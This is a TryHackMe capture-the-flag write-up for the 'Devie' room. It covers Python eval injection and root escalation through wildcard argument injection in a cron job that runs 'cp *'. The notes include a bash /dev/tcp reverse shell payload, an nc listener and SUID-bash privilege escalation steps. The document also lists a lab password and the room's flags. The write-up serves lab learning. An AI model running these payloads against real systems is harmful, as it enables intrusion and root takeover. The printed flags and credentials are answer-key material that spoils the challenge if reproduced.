# Room Name – Devie

> Difficulty: Medium
> Platform: TryHackMe  
> Focus: Eval vulnerability(python) ,  Privilege Escalation via Wildcard Injection (Cron + cp *)

---

## Objective

A developer has asked you to do a vulnerability check on their system.

---

## Reconnaissance & Enumeration

### Nmap Scan

```bash
nmap -sC -sV -oN nmap.txt 10.49.131.26
```

## Notes
eval vulnerability
```bash
__import__('os').system('bash -c "bash -i >& /dev/tcp/10.49.107.222/4444 0>&1"')

python3 -c 'import pty; pty.spawn("/bin/bash")'

#!/bin/bash

cd /home/gordon/reports/

cp * /home/gordon/backups/ [When * is used, the shell expands it to all filenames. If you create specially crafted filenames that start with -, cp will treat them as options, not files.]
nc -nlvp 4444


cat note
Hello Bruce,

I have encoded my password using the super secure XOR format.

I made the key quite lengthy and spiced it up with some base64 at the end to make it even more secure. I'll share the decoding script for it soon. However, you can use my script located in the /opt/ directory.

For now look at this super secure string:
NEUEDTIeN1MRDg5K


```

## credentials
gordon:G0th@mR0ckz!

## Enumeration-flag3

While running pspy64, a cron job executing:

/usr/bin/backup

Checking permissions:

ls -l /usr/bin/backup

-rwxr----- 1 root gordon 66 May 12 2022 /usr/bin/backup

Since we are in the gordon group, we can read it.

---

## Backup Script

cat /usr/bin/backup

#!/bin/bash
cd /home/gordon/reports
cp * /home/gordon/backups

Vulnerability:
The script runs as root and uses `cp *`.
Wildcard expansion allows argument injection via filenames starting with "-".

---

# Exploitation

cd /home/gordon/reports

# Clean old attempts
rm -- --*
rm bash

# Copy real bash binary
cp /bin/bash ./bash
chmod 4755 bash

# Inject malicious cp argument
touch -- "--preserve=mode"

# Wait for cron to execute.

# Verify ownership in backups
ls -l /home/gordon/backups/bash

Expected:
-rwsr-xr-x 1 root root bash

---

# Get Root

cd /home/gordon/backups
./bash -p
id
cat root/root.txt

Expected output:
uid=0(root)

---

# Key Takeaways

- Wildcards (*) in root scripts are dangerous
- Filenames starting with "-" can inject command-line options
- SUID works only on binaries
- Enumeration is critical


## Flags
1.THM{Car3ful_witH_3v@l}

2.THM{X0R_XoR_XOr_xOr}

3.THM{J0k3r$_Ar3_W1ld}
